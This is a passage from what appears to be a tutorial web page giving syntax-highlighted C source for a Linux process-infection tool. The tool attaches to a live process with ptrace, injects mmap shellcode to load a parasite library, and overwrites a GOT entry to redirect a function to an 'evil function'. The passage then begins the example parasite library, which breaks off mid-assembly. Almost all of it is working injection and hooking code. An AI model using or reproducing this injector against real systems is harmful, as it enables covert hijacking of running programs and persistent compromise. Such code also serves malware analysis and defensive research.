&nbsp; &nbsp; &nbsp; &nbsp; ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ehdr-&gt;e_ident<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> != 0x7f &amp;&amp; strcmp<span style="color: black;">(</span>&amp;ehdr-&gt;e_ident<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span>, <span style="color: #ff0000;">"ELF"</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%s is not an ELF file<span style="color: #000099; font-weight: bold;">\n</span>"</span>, file<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* we target executables only, althoug ET_DYN would be a viable target */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* as well */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ehdr-&gt;e_type != ET_EXEC &amp;&amp; ehdr-&gt;e_type != ET_DYN<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%s is not an executable or object file, cannot target process %d<span style="color: #000099; font-weight: bold;">\n</span>"</span>, file, pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ehdr-&gt;e_type == ET_DYN &amp;&amp; !et_dyn<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Target process is of type ET_DYN, but the '-d' option was not specified -- exiting...<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; phdr = <span style="color: black;">(</span>Elf32_Phdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_phoff<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get the base -- p_vaddr of text segment */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_phoff; i-- &gt; <span style="color: #cc66cc;">0</span>; phdr++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>phdr-&gt;p_type == PT_LOAD &amp;&amp; !phdr-&gt;p_offset<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elf_base = text_base = phdr-&gt;p_vaddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; phdr++;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data_segment = phdr-&gt;p_vaddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Failed to attach to process<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get the symbol relocation information */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>lp = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>get_plt<span style="color: black;">(</span>mem<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"get_plt() failed<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* inject mmap shellcode into process to load lib */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>check_for_lib<span style="color: black;">(</span>EVILLIB, fd<span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Injecting library<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>grsec<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; grsec_mmap_library<span style="color: black;">(</span>pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mmap_library<span style="color: black;">(</span>pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_attach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fclose<span style="color: black;">(</span>fd<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>fd = fopen<span style="color: black;">(</span>meminfo, <span style="color: #ff0000;">"r"</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"PID: %i cannot be checked, /proc/%i/maps does not exist<span style="color: #000099; font-weight: bold;">\n</span>"</span>, pid, pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Process %d appears to be infected, %s is mmap'd already<span style="color: #000099; font-weight: bold;">\n</span>"</span>, pid, EVILLIB<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>evilfunc = search_evil_lib<span style="color: black;">(</span>pid, evil_base<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Could not locate evil function<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Evil Function location: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, evilfunc<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Modifying GOT entry: replace &lt;%s&gt; with %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, <span style="color: #000000; font-weight: bold;">function</span>, evilfunc<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* overwrite GOT entry with addr to evilfunc (our replacement) */</span><br>
&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; lp<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>.<span style="color: #202020;">count</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strcmp<span style="color: black;">(</span>lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">name</span>, <span style="color: #000000; font-weight: bold;">function</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>et_dyn<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dyn_mmap_got_addr = <span style="color: black;">(</span>evil_base + <span style="color: black;">(</span>lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">offset</span> - elf_base<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;got_offset = <span style="color: black;">(</span>!et_dyn<span style="color: black;">)</span> ? lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">offset</span> : dyn_mmap_got_addr;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;export = memrw<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span>, got_offset, <span style="color: #cc66cc;">1</span>, pid, evilfunc<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>export == evilfunc<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Successfully modified GOT entry<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Failed at modifying GOT entry<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"New GOT value: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, export<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> evil_code<span style="color: black;">[</span><span style="color: #cc66cc;">256</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> initial_bytes<span style="color: black;">[</span><span style="color: #cc66cc;">12</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> injection_vaddr = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get a copy of our replacement function and search for transfer sequence */</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>evil_code, evilfunc, <span style="color: #cc66cc;">256</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* once located, patch it with the addr of the original function */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">256</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%.2x "</span>, evil_code<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>evil_code<span style="color: black;">[</span>i<span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+2</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+3</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>Located transfer code; patching it with %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, original<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; injection_vaddr = <span style="color: black;">(</span>evilfunc + i<span style="color: black;">)</span> + <span style="color: #cc66cc;">3</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!injection_vaddr<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Could not locate transfer code within parasite<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* patch jmp code with addr to original function */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>initial_bytes, injection_vaddr, INJECT_TRANSFER_CODE, pid, original<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Confirm transfer code: "</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">7</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\\</span>x%.2x"</span>, initial_bytes<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; puts<span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; done:<br>
&nbsp; &nbsp; &nbsp; &nbsp; munmap<span style="color: black;">(</span>mem, st.<span style="color: #202020;">st_size</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_detach"</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; close<span style="color: black;">(</span>md<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; fclose<span style="color: black;">(</span>fd<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Here is the example shared object parasite</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* libtest.c */</span><br>
<br>
<span style="color: #339933;">#include &lt;sys/syscall.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/types.h&gt;</span><br>
<br>
<span style="color: #993333;">int</span> evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>;<br>
<br>
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span><br>
_write <span style="color: black;">(</span><span style="color: #993333;">int</span> fd, <span style="color: #993333;">void</span> *buf, <span style="color: #993333;">int</span> count<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; <span style="color: #993333;">long</span> ret;<br>
<br>
&nbsp; __asm__ __volatile__ <span style="color: black;">(</span><span style="color: #ff0000;">"pushl %%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
